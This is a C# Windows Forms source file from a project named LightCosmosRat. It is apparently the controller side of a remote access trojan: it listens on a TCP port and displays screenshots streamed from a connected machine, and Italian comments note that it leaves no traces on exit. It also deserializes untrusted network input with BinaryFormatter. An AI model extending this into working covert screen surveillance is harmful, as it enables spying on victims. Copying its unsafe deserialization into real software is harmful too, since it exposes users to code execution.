using System;
using System.Drawing;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Runtime.Serialization.Formatters.Binary;
namespace LightCosmosRat
{
	/// <summary>
	/// Description of Form2.
	/// </summary>
	public partial class Form2 : Form
	{
        public bool HasConnected;
		public Thread ServerThread = null;
		public Thread ClientThread = null;
		public Form2()
		{
			//
			// The InitializeComponent() call is required for Windows Forms designer support.
			//
			InitializeComponent();
			
			//
			// TODO: Add constructor code after the InitializeComponent() call.
			//
			CheckForIllegalCrossThreadCalls = false;
            HasConnected = false;
		}
		void ConnectionHandler(Object myClient){
			TcpClient Client = (TcpClient)myClient;
			NetworkStream myStream = Client.GetStream();
			BinaryFormatter bf = new BinaryFormatter();
			while(true){
			PINTING:
				try{
				pictureBox1.Image = (Image) bf.Deserialize(myStream);
				}catch(Exception e){
					MessageBox.Show(e.Message);
					goto PINTING;
				}
			}
			
		}
		void ServerHandler(Object myServer){
			TcpListener Server = (TcpListener)myServer;
            TcpClient myClient = null;
			Server.Start();
            while (true)
            {
                try
                {
                    myClient = Server.AcceptTcpClient();
                }catch(ThreadInterruptedException iex)
                {
                    Server.Stop();
                    return;
                }
                try
                {
                    ClientThread.Abort();
                }catch(Exception e)
                {
                    e.ToString();
                }
                ClientThread = new Thread(ConnectionHandler);
                ClientThread.Start(myClient);
            }
		}
		void Button1Click(object sender, EventArgs e)
		{
			TcpListener Server;
			int ServerPort = 0;
			try{
				ServerPort = int.Parse(textBox1.Text);
			}catch(FormatException fe){
				MessageBox.Show(fe.Message,"Port Error",MessageBoxButtons.OK,MessageBoxIcon.Error);
				return;
			}
			
			try{
				Server = new TcpListener(IPAddress.Any,ServerPort);
			}catch(Exception ex){
				MessageBox.Show(ex.Message);
				return;
			}
			button1.Enabled = false;
			ServerThread = new Thread(ServerHandler);
			ServerThread.Start(Server);
		}
		void Form2FormClosing(object sender, FormClosingEventArgs e)
		{
            //Serve a non lasciare thread ambulanti in giro
            //tutto fixato ormai e privo di bug in ogni caso quando il programma si chiude non lascia tracce
            // testato anche con listener multipli
            if(!HasConnected)
            {
                try
                {
                    TcpClient Client = new TcpClient();
                    Client.Connect("localhost", int.Parse(textBox1.Text));
                }catch(Exception eppp)
                {

                }
            }
			try{
				ServerThread.Abort();
				ClientThread.Abort();
			}catch(Exception ess){
				MessageBox.Show(ess.Message);
			}
		}

        private void Form2_Load(object sender, EventArgs e)
        {

        }
    }
}
